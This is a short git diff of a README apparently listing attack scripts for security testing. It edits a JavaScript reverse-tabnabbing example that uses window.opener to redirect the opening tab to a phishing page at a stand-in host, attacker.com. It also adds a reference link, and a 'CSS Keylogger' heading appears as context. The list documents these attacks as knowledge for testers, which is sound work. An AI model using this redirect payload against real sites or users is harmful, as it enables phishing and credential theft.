@@ -17,9 +17,7 @@ A curated list of script and attack for security testing purposes and knowledgem
         redirect2Phishing = () => {
           // Wait for the deployment of the phishing site.
           setTimeout(() => {
-            window.opener.location =
-              `//attacker.com/${randomUserID}/${window.opener.location}`
-
+            window.opener.location.assign(`//attacker.com/${randomUserID}/${window.opener.location}`)
           }, 8000)
         };
 
@@ -38,6 +36,7 @@ A curated list of script and attack for security testing purposes and knowledgem
     ```  
     References:
     - https://dev.to/ben/the-targetblank-vulnerability-by-example
+    - https://sites.google.com/site/bughunteruniversity/nonvuln/phishing-with-window-opener
   
 ## CSS:
   - #### CSS Keylogger: 
